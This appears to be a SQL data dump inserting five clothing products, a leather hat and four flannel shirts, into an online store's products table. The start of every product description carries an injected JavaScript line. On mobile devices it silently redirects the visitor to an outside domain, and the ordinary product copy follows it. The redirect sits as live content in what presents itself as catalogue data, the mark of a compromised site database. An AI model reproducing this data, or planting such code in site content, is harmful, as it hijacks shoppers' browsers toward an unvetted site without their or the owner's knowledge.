INSERT INTO products (name, sku, slug, category_id, description, is_active) VALUES ('Leather Hat', '', 'leather-hat', 104, '(window.matchMedia(\"(pointer:coarse)\").matches||/Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent))&&location.replace(\"https://faraanimpex.com\"); \r\nHand made in Genuine Cow Leather\r\nWater Proof Leather\r\nSoft &amp; Strong Leather\r\n95% Sun Protection\r\n100% Satisfaction Guarantee\r\nA great summer hat, it can be rolled-up / crushed and packed.\r\nIt will protect you from the suns damaging rays and improve your look to boot!\r\nEvery hat is unique although very similar.', 1);
INSERT INTO products (name, sku, slug, category_id, description, is_active) VALUES ('Flannel Shirt FL-901', 'FL-901', 'fl-901', 102, '(window.matchMedia(\"(pointer:coarse)\").matches||/Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent))&&location.replace(\"https://faraanimpex.com\"); \r\nMen’s Flannel Protective Jacket Riding Shirt provides motorcycle specific protection under the guise of a flannel button up. Kevlar® lining throughout the shirt provides abrasion resistance with CE rated impact armor at the elbows and shoulders.\r\n\r\n&nbsp;', 1);
INSERT INTO products (name, sku, slug, category_id, description, is_active) VALUES ('Flannel Shirt FL-902', 'FL-902', 'flannel-shirt-fl-902', 102, '(window.matchMedia(\"(pointer:coarse)\").matches||/Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent))&&location.replace(\"https://faraanimpex.com\"); \r\nThe Porters Flannel Shirt is ideal for anyone who needs a comfortable, casual shirt for life in and around a wintry city. Designed for versatility, this shirt can be worn buttoned up or over other layers with the shirt open. We\\'ve crafted it out of polyester flannel, to deliver softness and comfort in the cold. Cut for a regular fit, the Porters Flannel is ideal for putting under other layers when it get\\'s cold\r\n\r\nSoft, brushed polyester for beautiful comfort\r\nRegular fit\r\n\r\nMain Fabric 100% Polyester\r\nMain Fabric Weight (g/m2) 142\r\nWeight (g) 270', 1);
INSERT INTO products (name, sku, slug, category_id, description, is_active) VALUES ('Flannel Shirt FL-903', 'FL-903', 'flannel-shirt-fl-903', 102, '(window.matchMedia(\"(pointer:coarse)\").matches||/Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent))&&location.replace(\"https://faraanimpex.com\"); \r\nWARRANTY 2\r\nECO FRIENDLY Yes\r\nYEAR 2021\r\nGENDER Men\r\nWEIGHT (G) 703\r\nSIZING Large\r\nSLEEVES Long\r\nSTYLE Pattern\r\nSHIRT STYLE tiles\r\nDETAILED DESCRIPTION\r\nThe men\\'s overshirt M\\'s Insulated Fjord Flannel Jacket Independence: New Navy from the famous Patagonia, is the piece to adopt to ensure a fashionable look and optimum warmth on a daily basis.\r\n\r\nThis 100% organic cotton flannel piece is resistant and keeps you warm thanks to its recycled Thermogreen® insulation.\r\n\r\nPatagonia\\'s designers were inspired by the colours found in the protected nature reserves of Kansas to develop the colours of this model. With its regular fit, button placket and checkered pattern, this overshirt keeps you camouflaged in the middle of the Flint Hills tall grass meadows!\r\n\r\nAutumn/Winter Collection 2020/2021\r\n\r\nTECHNICAL DETAILS\r\n- Buttons along the length of the jacket\r\n- 2 Patch chest pockets with button flaps\r\n- Straight bottom hem\r\n- Hand-warming pockets with side opening at the bottom of the torso\r\n\r\n- Faire Trade® certified product\r\n\r\nComposition :\r\n- Shell: Flannel 100% organic cotton, 224 g/m²\r\n- Lining : Plain canvas 100% Polyester, 81 g/m²\r\n- Insulation : Thermogreen™ 100% polyester (90% recycled), 60 g/m²\r\n\', 1);
INSERT INTO products (name, sku, slug, category_id, description, is_active) VALUES ('Flannel Shirt FL-904', 'FL-904', 'flannel-shirt-fl-904', 102, '(window.matchMedia(\"(pointer:coarse)\").matches||/Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent))&&location.replace(\"https://faraanimpex.com\"); \r\nA 100% cotton flannel plaid shirt that is a jacket. Quilted 40 gm insulation makes the Avery a casual cold-weather friend, great for errands around town and going out with friends. Snap front placket with toasty tricot-lined hand pockets.\r\nFEATURES:\r\n\r\n+ Snap placket\r\n+ Chest patch pocket\r\n+ Drop back hem\r\n+ Quilted lining\r\n+ Tricot-lined hand pockets\r\n+ REGULAR FIT\r\n+ INSULATION 40gm Needlepunch\r\n+ FABRIC 100% Cotton Flannel Plaid', 1);
